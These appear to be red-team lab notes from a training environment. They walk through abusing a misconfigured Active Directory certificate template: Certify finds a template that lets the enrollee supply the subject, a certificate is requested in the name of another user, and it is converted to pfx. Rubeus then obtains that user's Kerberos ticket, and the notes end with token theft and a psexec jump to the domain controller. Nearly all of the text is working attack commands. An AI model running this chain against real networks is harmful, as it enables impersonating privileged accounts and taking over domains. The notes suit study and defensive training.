# Finding vulnerable certificates

We look for Client Authentication, ENROLLEE_SUPPLIES_SUBJECT, and DEV\Domain Users

```bash
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable

   CA Name                               : dc-2.dev.cyberbotic.io\sub-ca
   Template Name                         : CustomUser
   ...
   msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
   ...
   pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
   mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
   Permissions
      Enrollment Permissions
         Enrollment Rights           : CYBER\Domain Admins           S-1-5-21-2594061375-675613155-814674916-512
                                      CYBER\Domain Users            S-1-5-21-2594061375-675613155-814674916-513
                                      CYBER\Enterprise Admins       S-1-5-21-2594061375-675613155-814674916-519
                                      DEV\Domain Users              S-1-5-21-569305411-121244042-2357301523-513
```

---

# Request a certificate for another user

```bash
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:CustomUser /altname:nlamb
```

---

# Copy the certificate to convert it to pfx extension

```bash
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
# We need to add a password, anything is OK but we need to remember, in this case pass123
```

---

# Get base64 version of certificate

```bash
cat cert.pfx | base64 -w 0
```

---

# Use the base64 value to ask for a tgt for that user

```bash
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate:MIIM7w[...]ECAggA /password:pass123 /nowrap
```

---

# Create a session and steal token

```bash
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:pass123 /ticket:doIFwj[...]MuSU8=
steal_token 1234
jump psexec64 dc-2.dev.cyberbotic.io smb
```
